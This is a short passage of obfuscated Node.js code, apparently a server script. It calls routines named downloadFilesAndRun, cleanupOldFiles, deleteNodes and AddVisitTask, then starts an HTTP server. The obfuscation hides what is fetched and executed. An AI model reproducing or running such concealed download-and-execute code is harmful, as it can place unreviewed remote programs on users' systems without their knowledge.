console[_0x1a8d68(0x1e6)](_0x1a8d68(0x1e7)+_0x174246[_0x1a8d68(0x1b0)]),null;}}async function startserver(){const _0x224629=_0x24e039;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x2413c7){console[_0x224629(0x1e6)](_0x224629(0x1ee),_0x2413c7);}}startserver()[_0x24e039(0x22b)](_0x3ae170=>{const _0x34d5db=_0x24e039;console[_0x34d5db(0x1e6)](_0x34d5db(0x1bb),_0x3ae170);}),app[_0x24e039(0x1d7)](PORT,()=>console[_0x24e039(0x1f7)](_0x24e039(0x1ac)+PORT+'!'));
